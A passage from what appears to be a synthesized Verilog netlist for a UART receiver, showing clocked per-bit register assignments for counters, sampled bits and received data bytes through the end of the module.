      cycle_counter[12] <= _002_[12];
  always @(posedge clk)
      cycle_counter[13] <= _002_[13];
  always @(posedge clk)
      bit_sample <= _001_;
  always @(posedge clk)
      bit_counter[0] <= _000_[0];
  always @(posedge clk)
      bit_counter[1] <= _000_[1];
  always @(posedge clk)
      bit_counter[2] <= _000_[2];
  always @(posedge clk)
      bit_counter[3] <= _000_[3];
  always @(posedge clk)
      received_data[0] <= _003_[0];
  always @(posedge clk)
      received_data[1] <= _003_[1];
  always @(posedge clk)
      received_data[2] <= _003_[2];
  always @(posedge clk)
      received_data[3] <= _003_[3];
  always @(posedge clk)
      received_data[4] <= _003_[4];
  always @(posedge clk)
      received_data[5] <= _003_[5];
  always @(posedge clk)
      received_data[6] <= _003_[6];
  always @(posedge clk)
      received_data[7] <= _003_[7];
  always @(posedge clk)
      uart_rx_data[0] <= _008_[0];
  always @(posedge clk)
      uart_rx_data[1] <= _008_[1];
  always @(posedge clk)
      uart_rx_data[2] <= _008_[2];
  always @(posedge clk)
      uart_rx_data[3] <= _008_[3];
  always @(posedge clk)
      uart_rx_data[4] <= _008_[4];
  always @(posedge clk)
      uart_rx_data[5] <= _008_[5];
  always @(posedge clk)
      uart_rx_data[6] <= _008_[6];
  always @(posedge clk)
      uart_rx_data[7] <= _008_[7];
endmodule
